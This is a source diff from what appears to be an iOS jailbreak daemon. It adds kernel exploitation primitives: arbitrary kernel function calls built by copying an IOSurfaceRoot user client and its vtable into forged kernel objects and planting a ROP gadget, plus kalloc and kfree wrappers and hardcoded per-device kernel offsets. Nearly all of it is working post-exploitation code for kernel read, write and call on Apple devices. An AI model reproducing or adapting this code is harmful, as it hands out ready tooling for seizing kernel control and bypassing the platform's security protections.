@@ -1,5 +1,9 @@
+#include "krw.h"
+#include "../boot_info.h"
 #include "./common/KernelRW.hpp"
 #include "./common/macros.h"
+#include "ipc.h"
+#include "offsets.h"
 #include <Foundation/Foundation.h>
 #include <mach/mach.h>
 #include <stdio.h>
@@ -11,6 +15,10 @@ static KernelRW *krw = NULL;
 uint64_t _kbase = 0;
 uint64_t _kern_proc = 0;
 uint64_t _all_proc = 0;
+
+uint64_t _fake_vtable = 0;
+uint64_t _fake_client = 0;
+mach_port_t _user_client = 0;
 
 int get_kernel_rw(void) {
   NSLog(@"[jailbreakd] Waiting for receiving kernel r/w handoff\n");
@@ -68,36 +76,8 @@ int get_kernel_rw(void) {
   krw = new KernelRW();
   krw->handoffPrimitivePatching(transmissionPort);
 
-  NSLog(@"[jailbreakd] Received Kernel R/W handoff!\n");
   krw->getOffsets(&_kbase, &_kern_proc, &_all_proc);
-
-  NSLog(@"[jailbreakd] kbase: 0x%llx, kslide: 0x%llx, kproc: 0x%llx, allProc: "
-        @"0x%llx\n",
-        _kbase, _kbase - 0xfffffff007004000, _kern_proc, _all_proc);
-
-  // krw.getOffsets(&kernelBase, &kernProc, &allProc);
-  // printf("[jailbreakd] kernelBase: 0x%llx, kernProc: 0x%llx, allProc:
-  // 0x%llx\n",
-  //        kernelBase, kernProc, allProc);
-
-  // uint64_t kslide = kernelBase - 0xfffffff007004000;
-  // printf("[jailbreakd] kslide: 0x%llx\n", kslide);
-
-  // uint64_t off_empty_kdata_page = 0xFFFFFFF0077D8000 + 0x100;
-
-  // uint64_t kbaseval = krw.kread64(0xfffffff007004000 + kslide);
-  // printf("[jailbreakd] kbaseval=0x%016llx\n", kbaseval);
-
-  // uint64_t empty_kdata_page = krw.kread64(off_empty_kdata_page + kslide);
-  // printf("[jailbreakd] empty_kdata_page=0x%016llx\n", empty_kdata_page);
-
-  // printf("[jailbreakd] Writing 0x4142434445464748 to empty_kdata_page\n");
-  // krw.kwrite64(off_empty_kdata_page + kslide, 0x4142434445464748);
-  // printf("[jailbreakd] Did it write? empty_kdata_page=0x%016llx\n",
-  //        krw.kread64(off_empty_kdata_page + kslide));
-  // krw.kwrite64(off_empty_kdata_page + kslide, empty_kdata_page);
-
-  printf("[jailbreakd] done\n");
+  NSLog(@"[jailbreakd] Received Kernel R/W handoff!\n");
   return 0;
 }
 
@@ -171,4 +151,85 @@ uint16_t kread16(uint64_t where) {
     kreadbuf(where, &out, sizeof(uint16_t));
   }
   return out;
+}
+
+uint64_t zm_fix_addr_kalloc(uint64_t addr) {
+  // se2 15.0.2 = 0xFFFFFFF00782E718, 6s 15.1 = 0xFFFFFFF0071024B8;
+  // XXX guess what is that address xD
+  uint64_t kmem = 0xFFFFFFF0071024B8 + get_kslide();
+  uint64_t zm_alloc = kread64(kmem); // idk?
+  uint64_t zm_stripped = zm_alloc & 0xffffffff00000000;
+
+  return (zm_stripped | ((addr)&0xffffffff));
+}
+
+uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2,
+               uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
+  uint64_t offx20 = kread64(_fake_client + 0x40);
+  uint64_t offx28 = kread64(_fake_client + 0x48);
+  kwrite64(_fake_client + 0x40, x0);
+  kwrite64(_fake_client + 0x48, addr);
+  uint64_t returnval = IOConnectTrap6(
+      _user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3),
+      (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
+  kwrite64(_fake_client + 0x40, offx20);
+  kwrite64(_fake_client + 0x48, offx28);
+  return returnval;
+}
+
+uint64_t kalloc(size_t ksize) {
+  uint64_t allocated_kmem =
+      kcall(bootInfo_getUInt64(@"off_kalloc_data_external") + get_kslide(),
+            ksize, 1, 0, 0, 0, 0, 0);
+  return zm_fix_addr_kalloc(allocated_kmem);
+}
+
+void kfree(uint64_t kaddr, size_t ksize) {
+  kcall(bootInfo_getUInt64(@"off_kfree_data_external") + get_kslide(), kaddr,
+        ksize, 0, 0, 0, 0, 0);
+}
+
+int init_kcall(void) {
+  _fake_vtable = bootInfo_getUInt64(@"kcall_fake_vtable_allocations");
+  _fake_client = bootInfo_getUInt64(@"kcall_fake_client_allocations");
+
+  uint64_t add_x0_x0_0x40_ret_func =
+      bootInfo_getUInt64(@"off_add_x0_x0_0x40_ret") + get_kslide();
+
+  io_service_t service = IOServiceGetMatchingService(
+      kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+  if (service == IO_OBJECT_NULL) {
+    printf(" [-] unable to find service\n");
+    exit(EXIT_FAILURE);
+  }
+  _user_client = 0;
+  kern_return_t err =
+      IOServiceOpen(service, mach_task_self(), 0, &_user_client);
+  if (err != KERN_SUCCESS) {
+    printf(" [-] unable to get user client connection\n");
+    exit(EXIT_FAILURE);
+  }
+  uint64_t uc_port = port_name_to_ipc_port(_user_client);
+  uint64_t uc_addr = kread64(uc_port + off_ipc_port_ip_kobject);
+  uint64_t uc_vtab = kread64(uc_addr);
+
+  for (int i = 0; i < 0x200; i++) {
+    kwrite64(_fake_vtable + i * 8, kread64(uc_vtab + i * 8));
+  }
+
+  for (int i = 0; i < 0x200; i++) {
+    kwrite64(_fake_client + i * 8, kread64(uc_addr + i * 8));
+  }
+  kwrite64(_fake_client, _fake_vtable);
+  kwrite64(uc_port + off_ipc_port_ip_kobject, _fake_client);
+  kwrite64(_fake_vtable + 8 * 0xB8, add_x0_x0_0x40_ret_func);
+
+  return 0;
+}
+
+int term_kcall(void) {
+  mach_port_deallocate(mach_task_self(), _user_client);
+  _user_client = 0;
+
+  return 0;
 }
